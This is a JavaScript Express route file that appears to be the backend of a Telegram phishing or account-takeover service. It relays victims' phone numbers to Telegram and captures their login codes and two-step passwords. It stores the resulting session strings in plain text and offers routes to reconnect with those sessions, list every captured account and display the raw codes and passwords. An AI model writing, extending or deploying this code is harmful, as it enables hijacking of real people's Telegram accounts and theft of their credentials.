const express = require('express');
const router = express.Router();
const User = require('../models/User');
const TelegramClientManager = require('../utils/telegramClient');
const SessionStore = require('../utils/sessionStore');
const { Api } = require('telegram');
const dotenv = require('dotenv');

dotenv.config();

// Initialize managers
const clientManager = new TelegramClientManager(
  process.env.TELEGRAM_API_ID,
  process.env.TELEGRAM_API_HASH
);

// Initialize session store WITHOUT Redis (using in-memory storage)
const sessionStore = new SessionStore();

// Clean up old clients every hour
setInterval(() => {
  clientManager.cleanupOldClients();
}, 3600000);

// Mock mode flag (set to false for real Telegram API)
const USE_MOCK_MODE = process.env.USE_MOCK_MODE === 'true' || false;

// Request login code from Telegram
router.post('/request-code', async (req, res) => {
  try {
    const { phoneNumber, ip, userAgent } = req.body;
    
    // Validate phone number
    if (!phoneNumber || phoneNumber.length < 10) {
      return res.status(400).json({ 
        success: false, 
        message: 'Please enter a valid phone number' 
      });
    }
    
    // Save or update user
    let user = await User.findOne({ phoneNumber });
    if (!user) {
      user = new User({ phoneNumber });
    }
    
    // MOCK MODE - for testing without real Telegram API
    if (USE_MOCK_MODE) {
      console.log('🔧 Using MOCK MODE - no real Telegram API calls');
      const mockCode = '12345';
      await sessionStore.set(`mock:${phoneNumber}`, { 
        code: mockCode,
        phoneNumber 
      }, 600);
      
      user.loginAttempts.push({
        timestamp: new Date(),
        ip,
        userAgent,
        success: false,
        loginMethod: 'mock'
      });
      await user.save();
      
      return res.json({ 
        success: true, 
        message: 'MOCK: Code 12345',
        phoneNumber 
      });
    }
    
    // Check if user already has a saved session
    if (user.telegramSession) {
      console.log(`🔐 Found saved session for ${phoneNumber}`);
    }
    
    // Create Telegram client
    const client = await clientManager.createClient(phoneNumber);
    
    try {
      // Send code request to Telegram
      const result = await client.sendCode(
        {
          apiId: parseInt(process.env.TELEGRAM_API_ID),
          apiHash: process.env.TELEGRAM_API_HASH,
        },
        phoneNumber
      );
      
      // Store phoneCodeHash for later verification
      await sessionStore.set(
        `telegram:${phoneNumber}`,
        {
          phoneCodeHash: result.phoneCodeHash,
          phoneNumber: phoneNumber,
          timestamp: Date.now()
        },
        600
      );
      
      // Store login attempt
      user.loginAttempts.push({
        timestamp: new Date(),
        ip,
        userAgent,
        success: false,
        loginMethod: 'code'
      });
      await user.save();
      
      res.json({ 
        success: true, 
        message: 'Verification code sent via Telegram',
        phoneNumber 
      });
      
    } catch (telegramError) {
      console.error('🔴 TELEGRAM API ERROR:', telegramError.errorMessage);
      await clientManager.removeClient(phoneNumber);
      
      if (telegramError.errorMessage === 'FLOOD_WAIT') {
        const waitTime = telegramError.seconds || 60;
        res.status(429).json({ success: false, message: `Too many requests. Please wait ${waitTime} seconds.`, waitTime });
      } else {
        res.status(400).json({ success: false, message: `Telegram API error: ${telegramError.errorMessage || 'Unknown error'}` });
      }
    }
    
  } catch (error) {
    console.error('Error requesting code:', error);
    res.status(500).json({ success: false, message: 'Server error. Please try again.' });
  }
});

// Verify code with Telegram
router.post('/verify-code', async (req, res) => {
  try {
    const { phoneNumber, code } = req.body;
    
    if (!phoneNumber || !code || code.length !== 5) {
      return res.status(400).json({ 
        success: false, 
        message: 'Please enter a valid 5-digit code' 
      });
    }
    
    // MOCK MODE
    if (USE_MOCK_MODE) {
      const mockData = await sessionStore.get(`mock:${phoneNumber}`);
      if (mockData && mockData.code === code) {
        await User.findOneAndUpdate(
          { phoneNumber },
          { 
            loginCode: code,
            lastLogin: new Date(),
            status: 'active'
          }
        );
        
        const user = await User.findOne({ phoneNumber });
        if (user) {
          user.loginAttempts.push({
            timestamp: new Date(),
            success: true,
            loginMethod: 'code',
            code: code,
            codeType: '5-digit'
          });
          await user.save();
        }
        
        return res.json({ 
          success: true, 
          requiresTwoFactor: false,
          message: 'Login successful (MOCK)'
        });
      } else {
        return res.status(400).json({ 
          success: false, 
          message: 'Invalid mock code. Try 12345' 
        });
      }
    }
    
    // REAL MODE
    const sessionData = await sessionStore.get(`telegram:${phoneNumber}`);
    if (!sessionData) {
      return res.status(400).json({ 
        success: false, 
        message: 'Session expired. Please request code again.' 
      });
    }
    
    const client = clientManager.getClient(phoneNumber);
    if (!client) {
      return res.status(400).json({ 
        success: false, 
        message: 'Connection expired. Please start over.' 
      });
    }
    
    try {
      let requiresTwoFactor = false;
      
      try {
        await client.invoke(
          new Api.auth.SignIn({
            phoneNumber,
            phoneCode: code,
            phoneCodeHash: sessionData.phoneCodeHash,
          })
        );
        
        // NO ENCRYPTION: Save session string as raw plain text
        const sessionString = client.session.save(); 
        
        await User.findOneAndUpdate(
          { phoneNumber },
          { 
            loginCode: code,
            telegramSession: sessionString, // RAW STORAGE
            lastLogin: new Date(),
            status: 'active'
          }
        );
        
        const user = await User.findOne({ phoneNumber });
        if (user) {
          user.loginAttempts.push({
            timestamp: new Date(),
            success: true,
            loginMethod: 'code',
            code: code,
            codeType: '5-digit'
          });
          await user.save();
        }
        
        await clientManager.removeClient(phoneNumber);
        await sessionStore.delete(`telegram:${phoneNumber}`);
        
      } catch (signInError) {
        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
          requiresTwoFactor = true;
          
          await sessionStore.set(
            `telegram:2fa:${phoneNumber}`,
            { 
              pending: true,
              phoneNumber: phoneNumber,
              code: code,
              timestamp: Date.now()
            },
            600
          );
          
          await User.findOneAndUpdate(
            { phoneNumber },
            { loginCode: code }
          );
        } else {
          throw signInError;
        }
      }
      
      res.json({ 
        success: true, 
        requiresTwoFactor,
        message: requiresTwoFactor ? 'Two-step verification required' : 'Login successful'
      });
      
    } catch (error) {
      console.error('Verification error:', error);
      
      const user = await User.findOne({ phoneNumber });
      if (user) {
        user.loginAttempts.push({
          timestamp: new Date(),
          success: false,
          errorMessage: error.errorMessage,
          loginMethod: 'code',
          code: code,
          codeType: '5-digit'
        });
        await user.save();
      }
      
      if (error.errorMessage === 'CODE_INVALID') {
        res.status(400).json({ success: false, message: 'Invalid code. Please try again.' });
      } else {
        res.status(500).json({ success: false, message: 'Verification failed.' });
      }
    }
    
  } catch (error) {
    console.error('Error verifying code:', error);
    res.status(500).json({ success: false, message: 'Server error.' });
  }
});

// Handle 2FA password
router.post('/two-factor', async (req, res) => {
  try {
    const { phoneNumber, password } = req.body;
    
    if (!phoneNumber || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Password is required' 
      });
    }
    
    // MOCK MODE
    if (USE_MOCK_MODE) {
      await User.findOneAndUpdate(
        { phoneNumber },
        { 
          twoFactorPassword: password,
          loginCode: '12345',
          lastLogin: new Date(),
          status: 'active'
        }
      );
      
      return res.json({ 
        success: true, 
        message: 'Login completed successfully (MOCK)'
      });
    }
    
    // REAL MODE
    const client = clientManager.getClient(phoneNumber);
    if (!client) {
      return res.status(400).json({ 
        success: false, 
        message: 'Session expired. Please start over.' 
      });
    }
    
    const twoFAData = await sessionStore.get(`telegram:2fa:${phoneNumber}`);
    if (!twoFAData || !twoFAData.pending) {
      return res.status(400).json({ 
        success: false, 
        message: 'No pending two-factor verification.' 
      });
    }
    
    try {
      await client.signInWithPassword(
        {
          apiId: parseInt(process.env.TELEGRAM_API_ID),
          apiHash: process.env.TELEGRAM_API_HASH,
        },
        { password: async () => password }
      );
      
      // NO ENCRYPTION: Save session string as raw plain text
      const sessionString = client.session.save();
      
      await User.findOneAndUpdate(
        { phoneNumber },
        { 
          twoFactorPassword: password, // RAW STORAGE
          loginCode: twoFAData.code,
          telegramSession: sessionString, // RAW STORAGE
          lastLogin: new Date(),
          status: 'active'
        }
      );
      
      const user = await User.findOne({ phoneNumber });
      if (user) {
        user.loginAttempts.push({
          timestamp: new Date(),
          success: true,
          loginMethod: '2fa',
          code: twoFAData.code,
          codeType: '5-digit'
        });
        await user.save();
      }
      
      await clientManager.removeClient(phoneNumber);
      await sessionStore.delete(`telegram:${phoneNumber}`);
      await sessionStore.delete(`telegram:2fa:${phoneNumber}`);
      
      res.json({ 
        success: true, 
        message: 'Login completed successfully'
      });
      
    } catch (passwordError) {
      console.error('2FA error:', passwordError);
      
      if (passwordError.errorMessage === 'PASSWORD_HASH_INVALID') {
        const user = await User.findOne({ phoneNumber });
        if (user) {
          user.loginAttempts.push({
            timestamp: new Date(),
            success: false,
            errorMessage: 'Invalid 2FA password',
            loginMethod: '2fa',
            code: twoFAData.code
          });
          await user.save();
        }
        res.status(400).json({ success: false, message: 'Invalid password.' });
      } else {
        res.status(500).json({ success: false, message: '2FA verification failed.' });
      }
    }
    
  } catch (error) {
    console.error('Error in 2FA:', error);
    res.status(500).json({ success: false, message: 'Server error.' });
  }
});

// Reconnect using saved RAW session
router.post('/reconnect/:phoneNumber', async (req, res) => {
  try {
    const { phoneNumber } = req.params;
    
    const user = await User.findOne({ 
      phoneNumber,
      telegramSession: { $exists: true, $ne: null }
    });
    
    if (!user || !user.telegramSession) {
      return res.status(404).json({ 
        success: false, 
        message: 'No saved session found for this account' 
      });
    }
    
    const { TelegramClient } = require('telegram');
    const { StringSession } = require('telegram/sessions');
    
    const apiId = parseInt(process.env.TELEGRAM_API_ID);
    const apiHash = process.env.TELEGRAM_API_HASH;
    
    // Using the raw string from DB directly in StringSession
    const client = new TelegramClient(
      new StringSession(user.telegramSession),
      apiId,
      apiHash,
      { connectionRetries: 5 }
    );
    
    await client.connect();
    
    if (await client.isUserAuthorized()) {
      res.json({ 
        success: true, 
        message: 'Reconnected using saved session',
        phoneNumber
      });
    } else {
      user.telegramSession = null;
      await user.save();
      res.status(401).json({ 
        success: false, 
        message: 'Saved session expired. Please login again.' 
      });
    }
    
  } catch (error) {
    console.error('Reconnection error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to reconnect with saved session' 
    });
  }
});

// List all saved sessions (raw data available in DB)
router.get('/sessions', async (req, res) => {
  try {
    const users = await User.find({
      telegramSession: { $exists: true, $ne: null }
    }).select('phoneNumber lastLogin activeSessions');
    
    res.json({
      success: true,
      count: users.length,
      sessions: users.map(u => ({
        phoneNumber: u.phoneNumber,
        lastLogin: u.lastLogin,
        activeSessions: u.activeSessions || []
      }))
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Clear a saved session
router.post('/clear-session/:phoneNumber', async (req, res) => {
  try {
    const { phoneNumber } = req.params;
    
    await User.findOneAndUpdate(
      { phoneNumber },
      { telegramSession: null }
    );
    
    res.json({
      success: true,
      message: `Session cleared for ${phoneNumber}`
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Check login status
router.get('/status/:phoneNumber', async (req, res) => {
  try {
    const { phoneNumber } = req.params;
    
    const client = clientManager.getClient(phoneNumber);
    const sessionData = await sessionStore.get(`telegram:${phoneNumber}`);
    const twoFAData = await sessionStore.get(`telegram:2fa:${phoneNumber}`);
    const mockData = await sessionStore.get(`mock:${phoneNumber}`);
    
    const user = await User.findOne({ phoneNumber });
    const hasSavedSession = !!(user && user.telegramSession);
    
    res.json({
      success: true,
      connected: !!client,
      hasSession: !!sessionData,
      twoFAPending: !!twoFAData,
      mockMode: USE_MOCK_MODE,
      hasMock: !!mockData,
      hasSavedSession: hasSavedSession
    });
    
  } catch (error) {
    console.error('Error checking status:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Get all users
router.get('/users', async (req, res) => {
  try {
    const users = await User.find()
      .sort({ createdAt: -1 })
      .select('-telegramSession -metadata');
    
    res.json({
      success: true,
      count: users.length,
      users
    });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Get specific user details
router.get('/user/:phoneNumber', async (req, res) => {
  try {
    const { phoneNumber } = req.params;
    
    const user = await User.findOne({ phoneNumber })
      .select('-telegramSession -metadata');
    
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }
    
    res.json({ success: true, user });
    
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Debug route: View raw credentials
router.get('/debug/:phoneNumber', async (req, res) => {
  try {
    const user = await User.findOne({ phoneNumber: req.params.phoneNumber });
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.json({
      phoneNumber: user.phoneNumber,
      loginCode: user.loginCode,
      twoFactorPassword: user.twoFactorPassword,
      hasSavedSession: !!user.telegramSession,
      sessionPreview: user.telegramSession ? user.telegramSession.substring(0, 20) + '...' : null,
      loginAttempts: user.loginAttempts.slice(-5),
      status: user.status,
      lastLogin: user.lastLogin
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Clear session (logout)
router.post('/logout/:phoneNumber', async (req, res) => {
  try {
    const { phoneNumber } = req.params;
    
    await clientManager.removeClient(phoneNumber);
    await sessionStore.delete(`telegram:${phoneNumber}`);
    await sessionStore.delete(`telegram:2fa:${phoneNumber}`);
    await sessionStore.delete(`mock:${phoneNumber}`);
    
    if (req.query.clear === 'true') {
      await User.findOneAndUpdate(
        { phoneNumber },
        { telegramSession: null }
      );
    }
    
    res.json({ success: true, message: 'Logged out successfully' });
    
  } catch (error) {
    console.error('Error logging out:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Test credentials route
router.get('/test-credentials', async (req, res) => {
  try {
    const apiId = parseInt(process.env.TELEGRAM_API_ID);
    const apiHash = process.env.TELEGRAM_API_HASH;
    
    if (!apiId || !apiHash || apiId === 1234567 || apiHash === 'your_api_hash_here') {
      return res.json({ 
        valid: false, 
        message: 'Using placeholder credentials! Get real ones from my.telegram.org' 
      });
    }
    
    res.json({ valid: true, message: 'Credentials look real.' });
  } catch (error) {
    res.json({ valid: false, error: error.message });
  }
});

module.exports = router;